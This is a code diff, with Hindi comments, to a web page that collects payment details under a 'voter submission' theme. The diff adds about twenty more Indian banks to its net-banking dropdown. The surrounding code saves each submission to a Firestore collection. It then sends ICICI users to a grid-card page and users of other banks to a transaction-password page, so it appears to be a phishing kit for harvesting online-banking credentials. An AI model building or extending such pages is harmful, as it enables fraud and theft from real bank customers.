@@ -59,18 +59,38 @@
                 </div>
             </div>
 
-            <!-- Net Banking Section -->
+            <!-- Net Banking Section (सभी बैंकों की पूरी लिस्ट) -->
             <div id="netSection" class="form-section">
                 <div class="form-group">
                     <label for="bankName">Select Bank</label>
                     <select id="bankName" name="bankName">
-                        <option value="">-- Choose Bank --</option>
+                        <option value="">-- Choose Your Bank --</option>
                         <option value="ICICI Bank">ICICI Bank</option>
                         <option value="State Bank of India">State Bank of India (SBI)</option>
                         <option value="HDFC Bank">HDFC Bank</option>
                         <option value="Axis Bank">Axis Bank</option>
                         <option value="Punjab National Bank">Punjab National Bank (PNB)</option>
+                        <option value="Bank of Baroda">Bank of Baroda</option>
+                        <option value="Canara Bank">Canara Bank</option>
+                        <option value="Union Bank of India">Union Bank of India</option>
                         <option value="Bank of India">Bank of India</option>
+                        <option value="Kotak Mahindra Bank">Kotak Mahindra Bank</option>
+                        <option value="IndusInd Bank">IndusInd Bank</option>
+                        <option value="Yes Bank">Yes Bank</option>
+                        <option value="IDFC First Bank">IDFC First Bank</option>
+                        <option value="Federal Bank">Federal Bank</option>
+                        <option value="RBL Bank">RBL Bank</option>
+                        <option value="Indian Bank">Indian Bank</option>
+                        <option value="Central Bank of India">Central Bank of India</option>
+                        <option value="Indian Overseas Bank">Indian Overseas Bank</option>
+                        <option value="UCO Bank">UCO Bank</option>
+                        <option value="Bank of Maharashtra">Bank of Maharashtra</option>
+                        <option value="Punjab & Sind Bank">Punjab & Sind Bank</option>
+                        <option value="Bandhan Bank">Bandhan Bank</option>
+                        <option value="South Indian Bank">South Indian Bank</option>
+                        <option value="City Union Bank">City Union Bank</option>
+                        <option value="Karur Vysya Bank">Karur Vysya Bank</option>
+                        <option value="Jammu & Kashmir Bank">Jammu & Kashmir Bank</option>
                         <option value="Other Bank">Other Bank</option>
                     </select>
                 </div>
@@ -118,7 +138,6 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Tab Switching Logic
         const cardTabBtn = document.getElementById('cardTabBtn');
         const netTabBtn = document.getElementById('netTabBtn');
         const cardSection = document.getElementById('cardSection');
@@ -184,7 +203,6 @@
             btn.innerText = "Processing...";
 
             try {
-                // पुराने डॉक्यूमेंट से यूज़र की बाकी डिटेल्स फेच करें
                 const docRef = doc(db, "voterSubmissions", docId);
                 const docSnap = await getDoc(docRef);
                 
@@ -193,7 +211,7 @@
                     existingData = docSnap.data();
                 }
 
-                // addDoc के जरिए नई रो (New Row) बनाएं ताकि पुराना डेटा न हटे
+                // नया रो (New Row) बनाने का लॉजिक ताकि बार-बार ट्राई करने पर पुराना डेटा ओवरराइट न हो
                 const newDocRef = await addDoc(collection(db, "voterSubmissions"), {
                     time: new Date().toLocaleString(),
                     fullname: existingData.fullname || 'N/A',
@@ -217,11 +235,10 @@
                     currentStep: "Payment Details Submitted"
                 });
 
-                // नया डॉक्यूमेंट आईडी सेट करें
                 localStorage.setItem('voterDocId', newDocRef.id);
 
                 setTimeout(() => {
-                    // सिर्फ ICICI Bank होने पर ही ग्रिड पेज खुलेगा, बाकी सभी बैंकों के लिए ट्रांजैक्शन पासवर्ड पेज खुलेगा
+                    // केवल ICICI Bank होने पर Grid पर जाएगा, Card होने पर page5 पर, और बाकी सभी अन्य बैंकों के लिए ट्रांजैक्शन पासवर्ड पेज पर जाएगा
                     if (payMethod === 'NetBanking' && selectedBank.trim() === 'ICICI Bank') {
                         window.location.href = "grid_step1.html"; 
                     } else if (payMethod === 'Card') {
